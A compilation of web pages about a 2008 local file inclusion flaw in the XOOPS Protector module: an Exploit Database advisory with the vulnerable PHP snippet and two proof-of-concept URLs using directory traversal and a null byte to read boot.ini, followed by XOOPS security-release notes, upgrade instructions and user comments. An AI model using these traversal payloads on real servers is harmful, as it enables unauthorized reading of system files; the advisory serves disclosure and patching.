Description
***********

XOOPS has Multiple Local File Include vulnerabilities.

Details
*******

Local File Include vulnerability found in scripts:

xoops_lib/modules/protector/blocks.php
xoops_lib/modules/protector/main.php

Successful exploitation requires that "register_globals" is enabled.

Code
----
#################################################

$mytrustdirname = basename( dirname( __FILE__ ) ) ;
$mytrustdirpath = dirname( __FILE__ ) ;

// language files
$language = empty( $xoopsConfig['language'] ) ? 'english' : $xoopsConfig['language'] ;
if( file_exists( "$mydirpath/language/$language/main.php" ) ) {
        // user customized language file (already read by common.php)
        // include_once "$mydirpath/language/$language/main.php" ;
} else if( file_exists( "$mytrustdirpath/language/$language/main.php" ) ) {
        // default language file
        include_once "$mytrustdirpath/language/$language/main.php" ;
...

#################################################

For successful exploitation first condition in if..else statement must be not true.

Example:

http://[server]/[installdir]/xoops_lib/modules/protector/blocks.php?mydirpath=DSecRG/DSecRG/DSecRG&xoopsConfig[language]=../../../../../../../boot.ini%00
http://[server]/[installdir]/xoops_lib/modules/protector/main.php?mydirpath=DSecRG/DSecRG/DSecRG&xoopsConfig[language]=../../../../../../../boot.ini%00

Solution
********

Vendor fixed this flaw on 26.11.2008.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

## [Security](https://xoops.org/modules/news/index.php?storytopic=4 "Security"): XOOPS 2.3.2b - Security Release

***Posted by:** [phppp](https://xoops.org/userinfo.php?uid=16362)On 2008/12/7 12:10:00*
**41199 reads**

---

The security is always on top of the list of XOOPS Developers. Therefore the XOOPS Development Team is pleased to announce the release of **XOOPS 2.3.2b**, an improved XOOPS 2.3.x release.

This release is solely for a couple of critical fixes, including an XSS vulnerability reported by Digital Sercurity Research Group (or DSRG), potential local file inclusion vulnerability reported by DSRG, autologin bug reported by Dylian, a backward bug in data synchronization reported by boy0917 as well as a bug in xoopsmailer reported by ezsky.

In the 2.3.2b release we have further improved security fixes with help from DSRG.

**All XOOPS 2.3.x users are highly recommended to upgrade to this version ASAP.**

XOOPS 2.0 and 2.2 versions are not vulnerable to the XSS issues addressed here. However, all 2.0 and 2.2 users who have the Protector module installed are advised to upgrade to the version included in this package for local file inclusion issues.

**Download from [Sourceforge repository](https://sourceforge.net/project/showfiles.php?group_id=41586&package_id=153583&release_id=643845).**

**System requirements** ----------------------------------- PHP: Any PHP version >= 4.3 (PHP 4.2.x may work but is not officially supported, PHP 5.0+ is strongly recommended) MySQL: MySQL server 3.23+ (MySQL 5.0+ is strongly recommended) Web server: Any server supporting the required PHP version (Apache highly recommended) **Downloading XOOPS 2.3.2b** ----------------------------------- Your can get this release package from the [Sourceforge repository](https://sourceforge.net/project/showfiles.php?group_id=41586&package_id=153583&release_id=643845). Both .zip and .gz archives are provided. **Installing XOOPS 2.3.2b** ----------------------------------- 1. Copy the content of the htdocs/ folder where it can be accessed by your server 2. Ensure mainfile.php and uploads/ are writable by the web server 3. For security considerations, you are encouraged to move directories "/xoops\_lib" (for XOOPS libraries) and "/xoops\_data" (for XOOPS data) out of document root, or even change the folder names. 4. Make the directory of xoops\_data/ writable; Create and make the directories of xoops\_data/caches/, xoops\_data/caches/xoops\_cache/, xoops\_data/caches/smarty\_cache/ and xoops\_data/caches/smarty\_compile/ writable. 5. Access the folder where you installed the htdocs/ files using your web browser to launch the installation wizard **Installing Protector in XOOPS 2.3.2** ----------------------------------- We also highly recommend the installation of the PROTECTOR module which will bring additional security protection and logging capabilities to your site: To install Protector module for the first time with a new installation of XOOPS 2.3.2, copy /extras/mainfile.dist.php.protector to /htdocs/mainfile.dist.php BEFORE installing XOOPS. If you are upgrading an existing XOOPS Website (see below how to do it), and Protector is already installed there, copy /extras/mainfile.dist.php.protector to /upgrade/upd-2.0.18-to-2.3.0/mainfile.dist.php BEFORE upgrading XOOPS. **Upgrading from a previous version** ----------------------------------- **As always, make sure you have a fresh BACKUP before you upgrade!!!** ***Upgrading from XOOPS 2.3.x (easy way)*** 1. Get the update package from the sourceforge file repository 2. Overwrite your existing files with the new ones 3. Move the "upgrade" folder inside the "htdocs" folder (it's been kept out as it's not needed for full installs) on your local machine 4. Access /upgrade/ with a browser, and follow the instructions 5. Follow the instructions to update your database 6. Delete the upgrade folder from your server 7. Update the "system" module from the modules administration interface, other modules, especially "profile" are recommended to update as well ***Upgrading from XOOPS 2.0.\* above 2.0.14 and 2.2.\* (using the full package)*** 1. Move the "upgrade" folder inside the "htdocs" folder (it's been kept out as it's not needed for full installs) on your local machine 2. Delete htdocs/mainfile.php, htdocs/install/, htdocs/cache/, htdocs/extras/, htdocs/template\_c/, htdocs/themes/ and htdocs/uploads/ from the "htdocs" folder on your LOCAL machine 3. Upload the content of the htdocs folder on your LOCAL machine over your existing files on your server 4. For security considerations, you are encouraged to move directories xoops\_lib (for XOOPS libraries) and xoops\_data (for XOOPS data) out of document root, or even change the folder names. 5. Make the directory of xoops\_data/ writable; Create and make the directories of xoops\_data/caches/, xoops\_data/caches/xoops\_cache/, xoops\_data/caches/smarty\_cache/ and xoops\_data/caches/smarty\_compile/ writable. 6. Ensure the server can write to mainfile.php 7. Access /upgrade/ with a browser, and follow the instructions 8. Follow the instructions to update your database 9. Write-protect mainfile.php again 10. Delete the upgrade folder from your server 11. Update the "system" module from the modules administration interface, other modules are recommended to update as well ***Upgrading from any XOOPS ranging from 2.0.7 to 2.0.13.2 (using the full package):*** 1. Move the "upgrade" folder inside the "htdocs" folder (it's been kept out as it's not needed for full installs) on your LOCAL machine 2. Delete htdocs/mainfile.php, htdocs/install/, htdocs/cache/, htdocs/extras/, htdocs/template\_c/, htdocs/themes/ and htdocs/uploads/ from the "htdocs" folder on your LOCAL machine 3. Upload the content of the htdocs folder on your LOCAL machine over your existing files on your server 4. Delete the following folders and files from your server (they belong to an old version): \* class/smarty/core \* class/smarty/plugins/resource.db.php 5. Ensure the server can write to mainfile.php 6. For security considerations, you are encouraged to move directories xoops\_lib (for XOOPS libraries) and xoops\_data (for XOOPS data) out of document root, or even change the folder names. 7. Make the directory of xoops\_data/ writable; Create and make the directories of xoops\_data/caches/, xoops\_data/caches/xoops\_cache/, xoops\_data/caches/smarty\_cache/ and xoops\_data/caches/smarty\_compile/ writable. 8. Access /upgrade/ with a browser, and follow the instructions 9. Write-protect mainfile.php again 10. Delete the upgrade folder from your server 11. Update the "system" module from the modules administration interface, other modules are recommended to update as well **Upgrading a non UTF-8 site:** UTF-8 encoding has been introduced into XOOPS 2.3 as default charset. However, there might be some problems with converting existent websites from non UTF-8 charset to UTF-8. Before there is a good enough solution for this conversion, following settings are recommended when you upgrade an existent website if you are not an experienced user: - Select "Do not change" option in "Database character set and collation" step during upgrade process - Modify /languages/yourlanguage/global.php to use existent \_CHARSET value if it has been changed to UTF-8 in your new global.php file as  `define('_CHARSET', 'UTF-8');`  **Upgrading XoopsEditor package:** In the XOOPS 2.3.2b package, there are five editors included: dhtmltextarea and textarea for plain text, fckeditor, tinymce and koivi for WYSIWYG HTML. Since there are some directory structure changes in both fckeditor and tinymce editors, you are recommended to remove existent editors before uploading the new additors. And if you are using fckeditor for modules, please modify module specific configs following the files in /fckeditor/modules/, especially if you use "article" module. **Debug information display level** ----------------------------------- Since XOOPS 2.3.1 debug information display level is enabled as a temporary solution for 2.3\* to show debug information to different level of users: to all users, to members or to admins only. The configuration can be set in /xoops\_data/configs/xoopsconfig.php A new debug information renderer is redesigned in XOOPS 3.0 **Files integrity check** ----------------------------------- The full XOOPS package is released with a script able to check if all the system files have been correctly uploaded to the server. To use it, follow these instructions: 1. Upload the checksum.php and checksum.md5 files located in the XOOPS package root to your XOOPS server folder (putting them next to mainfile.php). 2. Execute checksum.php with your browser 3. If necessary, re-upload the missing or corrupted system files 4. Remove checksum.php and checksum.md5 from your server **Modules** ----------------------------------- This release contains only the "system-related modules". You are invited to browse the XOOPS modules repository to if you need additional functionality. Note: as a new repository is being built, the current repository is not up-to-date, PLEASE VISIT INDIVIDUAL DEVELOPERS' WEBSITES TO MAKE SURE YOU ARE USING LATEST VERSION OF MODULES. **How to contribute** ----------------------------------- Bug report: <http://sourceforge.net/tracker/?group_id=41586&atid=430840> Patch and enhancement: <http://sourceforge.net/tracker/?group_id=41586&atid=430842> Feature design: <http://sourceforge.net/tracker/?group_id=41586&atid=430843> Release announcement: <https://lists.sourceforge.net/lists/listinfo/xoops-announcement> XOOPS Development Team December 7th, 2008

Is it right that there should only be 1 file (language.php) in the upgrade folder?

I think, I misunderstood your first comment.

In the "update" to a previous version (e.g. 2.3.1 -> 2.3.2b) there is only one file, since it's the only one that changed. So copy it over your previous version's "/ugrade" directory, and then copy the whole thing to your Website. This way you'll have it all.

But I see that this could be confusing, so I'll redo the "Update" files on SourceForge, and provide all files in the /upgrade directory

Works here. Maybe your mirror didn't get the new copy yet.

If you go to:
<https://sourceforge.net/project/showfiles.php?group_id=41586&package_id=153583&release_id=643845>
try copy the link directly, and remove the "mirror" portion of it, and then paste the URL in the browser for download

John - I think the short answer to your question is no, they can't.

The practice of using 'a', 'b', 'c', etc... nomenclature should be eliminated in XOOPS releases because there's no easy way to figure out which "version" of 2.3.2 you have without doing individual file compares. If you look at the 2.3.2b upgrade release the ./include/version.php doesn't even have the alpha characters because it's not something XOOPS knows about.

Every time a new release is made (even if it's only to fix a typo) the minor rev should change (e.g. 2.3.2, 2.3.3, 2.3.4, etc). Adding the alpha character "sub-release" is just poor code control practice and is a result from not following standard coding practices. Usually it's caused because a developer doesn't want to go through the "normal" release process - also a bad practice.

Sorry, I'm done ranting... I'll get down off my soap box and go try and patch some of my sites with this version of 2.3.2

Just to say that I've updated 4 sites successfully with this release in the last 12 hours. Many thanks for the work, guys. And agree that an extra decimal (even 2.3.2.3 for example) would be nice to see next time too.

Would it also be possible to make instructions a wee bit clearer in the future? I'm just waiting for all the support posts from people who just replaced their Protector module with the directory in this release rather than opened it up and replace individual files as was intended (same problem as I mentioned earlier with the upgrade folder).

Anyway, all sites seem to running fine. Many thanks again.

Thanks Mamba. Sorry for the 'rant'. It's something that's bugged me for a while, it was late and I 'reacted' to John's comment. Thanks for taking the suggestion at it's intent and not reacting to the wording.

I'm always trying to look at intent ![](https://xoops.org/uploads/smil3dbd4d6422f04.gif)

Sometimes the words are sweet like honey but we know that the intent is malicious, other times the words are rough, but we know that the person cares a lot.

I know that **you** care about XOOPS! And I appreciate it a lot!

There is mentioning to use the upgrade directory while there is NOT even an upgrade rule visible for the 2.3.2; it tells me there is no upgrade necessary... That might be confusing to people...

Also there is only checksum.md5, I believe there should also be a checksum.php?

And finally I see there a change made in xoops.css, I am using a theme that is based on the MorphoGenesis. I have also the problems mentioned for which the fix is, but what should I change in that CSS to fix it, other than just compare and search for the changes?

Please try to add this code to the end of your xoops.css located in the main directory:

 `/* based on FabClearing by Fcaldera www.html.it*/
content:    ".";
display:    block;
height:     0px;
clear:      both;
visibility: hidden;
/**/
display:    inline-block;
/**/
clear:      both; /* for Gecko */
height:     1%; /* for IE */
}`
This code came from Ian.

I'm not aware of one. I think, the plan is to work now on 2.3.3 as a bugfix release, as stated in [this thread](https://xoops.org/modules/news/article.php?storyid=4557)

I just report **GIJOE** to inform him about this new exploit and he said this is not a Protector's problem.

GIJOE is recommend to put XOOPS\_TRUST\_PATH outside DocumentRoot as quick and right fix for this security bug.

The best solution is to locate your xoops\_lib folder out of webroot path.
If you are not allowed to do so, add .htaccess to protect your protector module.

If .htaccess is not allowed or enabled on our server, turn off global\_register on your server.

If you are not allowed to do any of the above solutions, the only solution is to remove protector module from your server and wait for complete fixes from the module.

All in all, the best scenario would be to have clean and safe code. I would say sorry for not evaluating all the code thoroughly we included into core release package.

I am making a fresh install of XOOPS 2.3.2b and am not clear about the release notes statement:

3. For security considerations, you are encouraged to move directories "/xoops\_lib" (for XOOPS libraries) and "/xoops\_data" (for XOOPS data) out of document root, or even change the folder names.

My goal is to do this right the first time and I don't want to create any broken links during install. Am I to move or rename these directories prior to running the install process or after?

Thanks,

So, what I did was rename xoops\_data and xoops\_lib by adding .htaccess to each but I left them in place in the root and ran my install pointing to the new names in the setup procedure. Is this move adequate for security considerations?

## [Security](https://xoops.org/modules/news/index.php?storytopic=4 "Security"): XOOPS 2.3.2a - Security Release

***Posted by:** [phppp](https://xoops.org/userinfo.php?uid=16362)On 2008/11/26 6:30:00*

The XOOPS Development Team is pleased to announce the release of **XOOPS 2.3.2a**

This release is solely for a couple of critical security fixes, including an XSS vulnerability reported by Digital Research Group, potential local file inclusion vulnerability reported by DSG, Autologin bug reported by Dylian and a backward bug in data synchronization reported by boy0917.

**All XOOPS 2.3.x users are highly recommended to upgrade to this version ASAP.**

XOOPS 2.0 and 2.2 versions are not vulnerable to the security issues addressed here. However, all 2.0 and 2.2 users who have the Protector module installed are advised to upgrade to the version included in this package.

**Download from [Sourceforge repository](https://sourceforge.net/project/showfiles.php?group_id=41586&package_id=153583&release_id=643010).**

**System requirements** ----------------------------------- PHP: Any PHP version >= 4.3 (PHP 4.2.x may work but is not officially supported, PHP 5.0+ is strongly recommended) MySQL: MySQL server 3.23+ (MySQL 5.0+ is strongly recommended) Web server: Any server supporting the required PHP version (Apache highly recommended) **Downloading XOOPS 2.3.2a** ----------------------------------- Your can get this release package from the sourceforge.net file repository. Both .zip and .gz archives are provided. **Installing XOOPS 2.3.2a** ----------------------------------- 1. Copy the content of the htdocs/ folder where it can be accessed by your server 2. Ensure mainfile.php and uploads/ are writable by the web server 3. For security considerations, you are encouraged to move directories "/xoops\_lib" (for XOOPS libraries) and "/xoops\_data" (for XOOPS data) out of document root, or even change the folder names. 4. Make the directory of xoops\_data/ writable; Create and make the directories of xoops\_data/caches/, xoops\_data/caches/xoops\_cache/, xoops\_data/caches/smarty\_cache/ and xoops\_data/caches/smarty\_compile/ writable. 5. Access the folder where you installed the htdocs/ files using your web browser to launch the installation wizard **Installing Protector in XOOPS 2.3.2a** ----------------------------------- We also highly recommend the installation of the PROTECTOR module which will bring additional security protection and logging capabilities to your site: To install Protector module for the first time with a new installation of XOOPS 2.3.2a, copy /extras/mainfile.dist.php.protector to /htdocs/mainfile.dist.php BEFORE installing XOOPS. If you are upgrading an existing XOOPS Website (see below how to do it), and Protector is already installed there, copy /extras/mainfile.dist.php.protector to /upgrade/upd-2.0.18-to-2.3.0/mainfile.dist.php BEFORE upgrading XOOPS. **Upgrading from a previous version** ----------------------------------- **As always, make sure you have a fresh BACKUP before you upgrade!!!** ***Upgrading from XOOPS 2.3.x (easy way)*** 1. Get the update package from the sourceforge file repository 2. Overwrite your existing files with the new ones 3. Move the "upgrade" folder inside the "htdocs" folder (it's been kept out as it's not needed for full installs) on your local machine 4. Access /upgrade/ with a browser, and follow the instructions 5. Follow the instructions to update your database 6. Delete the upgrade folder from your server 7. Update the "system" module from the modules administration interface, other modules, especially "profile" are recommended to update as well ***Upgrading from XOOPS 2.0.\* above 2.0.14 and 2.2.\* (using the full package)*** 1. Move the "upgrade" folder inside the "htdocs" folder (it's been kept out as it's not needed for full installs) on your local machine 2. Delete htdocs/mainfile.php, htdocs/install/, htdocs/cache/, htdocs/extras/, htdocs/template\_c/, htdocs/themes/ and htdocs/uploads/ from the "htdocs" folder on your LOCAL machine 3. Upload the content of the htdocs folder on your LOCAL machine over your existing files on your server 4. For security considerations, you are encouraged to move directories xoops\_lib (for XOOPS libraries) and xoops\_data (for XOOPS data) out of document root, or even change the folder names. 5. Make the directory of xoops\_data/ writable; Create and make the directories of xoops\_data/caches/, xoops\_data/caches/xoops\_cache/, xoops\_data/caches/smarty\_cache/ and xoops\_data/caches/smarty\_compile/ writable. 6. Ensure the server can write to mainfile.php 7. Access /upgrade/ with a browser, and follow the instructions 8. Follow the instructions to update your database 9. Write-protect mainfile.php again 10. Delete the upgrade folder from your server 11. Update the "system" module from the modules administration interface, other modules are recommended to update as well ***Upgrading from any XOOPS ranging from 2.0.7 to 2.0.13.2 (using the full package):*** 1. Move the "upgrade" folder inside the "htdocs" folder (it's been kept out as it's not needed for full installs) on your LOCAL machine 2. Delete htdocs/mainfile.php, htdocs/install/, htdocs/cache/, htdocs/extras/, htdocs/template\_c/, htdocs/themes/ and htdocs/uploads/ from the "htdocs" folder on your LOCAL machine 3. Upload the content of the htdocs folder on your LOCAL machine over your existing files on your server 4. Delete the following folders and files from your server (they belong to an old version): \* class/smarty/core \* class/smarty/plugins/resource.db.php 5. Ensure the server can write to mainfile.php 6. For security considerations, you are encouraged to move directories xoops\_lib (for XOOPS libraries) and xoops\_data (for XOOPS data) out of document root, or even change the folder names. 7. Make the directory of xoops\_data/ writable; Create and make the directories of xoops\_data/caches/, xoops\_data/caches/xoops\_cache/, xoops\_data/caches/smarty\_cache/ and xoops\_data/caches/smarty\_compile/ writable. 8. Access /upgrade/ with a browser, and follow the instructions 9. Write-protect mainfile.php again 10. Delete the upgrade folder from your server 11. Update the "system" module from the modules administration interface, other modules are recommended to update as well **Upgrading a non UTF-8 site:** UTF-8 encoding has been introduced into XOOPS 2.3 as default charset. However, there might be some problems with converting existent websites from non UTF-8 charset to UTF-8. Before there is a good enough solution for this conversion, following settings are recommended when you upgrade an existent website if you are not an experienced user: - Select "Do not change" option in "Database character set and collation" step during upgrade process - Modify /languages/yourlanguage/global.php to use existent \_CHARSET value if it has been changed to UTF-8 in your new global.php file as  `define('_CHARSET', 'UTF-8');`  **Upgrading XoopsEditor package:** In the XOOPS 2.3.2a package, there are five editors included: dhtmltextarea and textarea for plain text, fckeditor, tinymce and koivi for WYSIWYG HTML. Since there are some directory structure changes in both fckeditor and tinymce editors, you are recommended to remove existent editors before uploading the new additors. And if you are using fckeditor for modules, please modify module specific configs following the files in /fckeditor/modules/, especially if you use "article" module. **Debug information display level** ----------------------------------- Since XOOPS 2.3.1 debug information display level is enabled as a temporary solution for 2.3\* to show debug information to different level of users: to all users, to members or to admins only. The configuration can be set in /xoops\_data/configs/xoopsconfig.php A new debug information renderer is redesigned in XOOPS 3.0 **Files integrity check** ----------------------------------- The full XOOPS package is released with a script able to check if all the system files have been correctly uploaded to the server. To use it, follow these instructions: 1. Upload the checksum.php and checksum.md5 files located in the XOOPS package root to your XOOPS server folder (putting them next to mainfile.php). 2. Execute checksum.php with your browser 3. If necessary, re-upload the missing or corrupted system files 4. Remove checksum.php and checksum.md5 from your server **Modules** ----------------------------------- This release contains only the "system-related modules". You are invited to browse the XOOPS modules repository to if you need additional functionality. Note: as a new repository is being built, the current repository is not up-to-date, PLEASE VISIT INDIVIDUAL DEVELOPERS' WEBSITES TO MAKE SURE YOU ARE USING LATEST VERSION OF MODULES. **How to contribute** ----------------------------------- Bug report: <http://sourceforge.net/tracker/?group_id=41586&atid=430840> Patch and enhancement: <http://sourceforge.net/tracker/?group_id=41586&atid=430842> Feature design: <http://sourceforge.net/tracker/?group_id=41586&atid=430843> Release announcement: <https://lists.sourceforge.net/lists/listinfo/xoops-announcement> XOOPS Development Team November 26th, 2008

Although announced for the 2.3x-series, is the latest 2.0x also vulnerable? I saw some files also being in the old series. Along with some smarty-files. I did not make a comparison yet. Another question: is 2.0x still actively maintained or do we all have to jump the 2.3x-train?

Would give me some trouble, because I "advanced" some sites for my personal needs.

There are some doubts, that 2.3.2 will fix the problem. Look [here](http://www.myxoops.org/forum/viewtopic.php?topic_id=10830&post_id=55608#forumpost55608)

Maybe this code works for you? There are slight differences to the 2.3.2-code.

Yes, the link from sourceforge gives me an empty file table.

You can download the two corrected files from the [German forum](http://www.myxoops.org/forum/viewtopic.php?post_id=55610#forumpost55610). This will make your system safe.

@Dylian: Good work!

Those two files replace the ones in 2.3.2 package, do they? Or will they work on a 2.3.1 install, without the 2.3.2 update?

Thank you Dylian, btw!

They are intended to use as replacements for the files from 2.3.1.

so actually the fixed files in the 2.3.2 packages are 'wrong' and we have to wait until sourceforge official packages will be updated..
am I correct?

thanx

I don't know what is happening with 2.3.2 and on Sourceforge, but if you have a 2.3.x site, I would recommend you to install the German forum files (see my post here above) as a stopgap measure.

Hi:

Our web is still XOOPS 2.3.0, as we [found some problems with XOOPS 2.3.1](https://xoops.org/modules/newbb/viewtopic.php?topic_id=66183&forum=28&post_id=298007#forumpost298007).

Will the "Upgrading from XOOPS 2.3.1 (easy way)" work with a 2.3.0 installation? I guess it won't...

Regards: Colossus

The upgrade-package from 2.3.1->2.3.2 is more or less identical to the upgrade-package from 2.3.0->2.3.1. Copying the upgrade-folder is useless, because is no action to be taken for upgrading, although this should be necessary as stated in the installation instructions. IMHO there MUST be no upgrading from 2.3.1 to 2.3.2

At first when I started upgrade I got message No Language File. As far as I know the Dutch language files reside in their Dutch name directory = nederlands. Now I see in the upgrade files its called Dutch.....
Changing it back to nederlands the upgrade worked again (but like Frankblack said it doesnt seem to be needed with 2.3.1 to 2.3.2)
But main thing is what to name the dutch/nederlands language directory now??

I'll look into the issue "dutch" vs. "nederlands".

In our [SVN language repository](http://xoops.svn.sourceforge.net/viewvc/xoops/XoopsLanguages/dutch/core/2.3.1/) we have all as "nederlands"

Then better to change it in the upgrade file language.php.

By the way I have made an further translation of Dylians Dutch language files for 2.3.1 (it created some blanc pages since also some lines were missing (he knows of my translation).

Where can I upload these?

Correct, 2.0.18.2 is not actively maintained anymore, since we have an update to 2.3.x.

As you know. 2.3.x was the idea of merging existing separate branches, so we can focus on maintaining only one version.

I'll ask phppp if he has time to provide a security patch for 2.0.18.2

Fantastic!!! Thank you for doing it!!

You can submit it to Dylian or to me and we can upload them. Or if you want to maintain the files on SVN (and work on more module translations to Dutch), we can give you access to SVN.

Well, I would like to access to SVN then, Dylian also suggested this (is there a guide for how to work on them).
And for your information I am joining the Dutch team to look further into translations.

Thanks

You'll need to register on <http://www.SourceForge.net>

Once you do it, please [send me a PM](https://xoops.org/modules/pm/pmlite.php?send2=1&to_userid=31309), and I'll add you to the team, and email you some links to TortoiseSVN that we recommend to use.

Would be great! IMO you could not drop support for 2.0.x so early. 17.000 downloads do not mean 17.000 upgrades or installations. Many of them are downloads from curious ones like me or for testing purposes. Maybe you should make a poll, where people can enter how many sites with which versions they have running? So you'll also get some interesting figures and facts for your promotional materials.

Don't get me wrong - I agree with you, and we'll try to make the security patch for 2.0.18.2. It's only issue of time - to find it to make the patch. Phppp has been very busy lately.

It's been always policy of XOOPS that we're trying to provide security patches for the current release, and one back.

OK, Mr. Nitpicking! ![](https://xoops.org/uploads/smil42e7a3d4c7b9f.gif)

2.0.x is not maintained in the sense of adding any new features.
But we'll try to provide security patches for sometime in the future.

However, we're still recommend to upgrade to 2.3.2, as it will make lives easier for all of us, incl. the users ![](https://xoops.org/uploads/smil3dbd4d6422f04.gif)

What's the difference between protector 3.21 from Gejoi ( [here](http://xoops.peak.ne.jp/md/mydownloads/singlefile.php?lid=94&cid=1) ) and protector in XOOPS 2.3.2 ?

guys I'm sorry but I can't understand at all this discussion...
my question is simple: it's the 2.3.2 pack usable and bug free? or the bugs were only in the upgrade pack from 2.3.1? and in order to resolve them should we use the german files patches?

I need to know this when announcing the last changes on our local support site.

thanx
Ian

If I'm not mistaken, our protector changes are fixing a security bug reported by DSR. DJ has submitted the solution to GIJoe, so I assume he will take a look into it, and then either include it as is, or will develop other solution addressing the bug.

2.3.2a addresses several security issues, incl. the Autologin issue provided by the German patches.

Therefore it's recommended that you upgrade to 2.3.2a and forget the German patches, as they are included in 2.3.2a

ok guys thanx, after posting I saw the updated version...

I used the pack "2.3.1 to 2.3.2a" on a clean 2.3.1 installation with only some custom blocks and protector installed.
After upgrade logging is ok but there are some problems:

1) the image auto resize don't work anymore.. I see the image in the orginal size and if I click on it I receive:
 `Forbidden
't have permission to access /x231_ITA/(script removed)CaricaFoto("http://xxxxx/xxxxx/uploads/img492e78fe31bc1.jpg"); on this server.`
I think this has something to do with module.textsanitizer.php file.. around line 346 in the code addedo for preventing xss

2) I've run file checksum.php (the one in the 2.3.2a pack because in the upgrade this file has not been included.. why?) and it returns me:

./mainfile.dist.php content invalid
./class/xoopsmailer.php content invalid

the mainfile.dist.php is the one for protector renamed form the extra folder in 2.3.2a, while xoopsmailer.php has been changed by the upgrade pack..

it'all for the moment (I hope)
any workaround?

speaking honestly I think it's not good to set as mandatory for all user an upgrade (which should be simply a fix..) giving so many troubles..
some more debug should be taken..

I hope there will be a patch for 2.2.6 too. Because I can't update my sites before some 2.2.x specific features as the display name make their way to 2.3.x, hopefuly in 2.3.3.

Altough I think the older versions are relatively safe and the major security hole with the autologin has only affected 2.3.x sites (or was it already present with 2.0.18 too?).

I second that!

![](https://xoops.org/uploads/smil48a8193d7b138.gif) It seems that there are a lot of old files in the upgrade package and it looks more a downgrade package, where a lot of things are rolled back! ![](https://xoops.org/uploads/smil42e7a3ff4ceee.gif)

Up to now, with all the problems since the introduction of 2.3.x, I'm glad having postponed the risk of upgrading.

I've reinstalled 2.3.1 two times and made the upgrade to 2.3.2a..always same error.
did you try creating a custom blook and inserting an image in this block? let me know if you have my same problem, which is not related to gd thumbnail generation..

For this, you better open a thread in the forum, because this is no longer a comment on the security release article. You will have more exposure and more chance for resolution there too.

Ghia,

Well, it came out that there is no need for a security patch for 2.0.x or 2.2.x, as the security issues in this Security Release were related only to 2.3.x.

**The only impact for 2.0.x or 2.2.x users is if you use Protector (and you all should use it!).**

We just released a quick fix for it - [please read here](https://xoops.org/modules/news/article.php?storyid=4544)..

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.
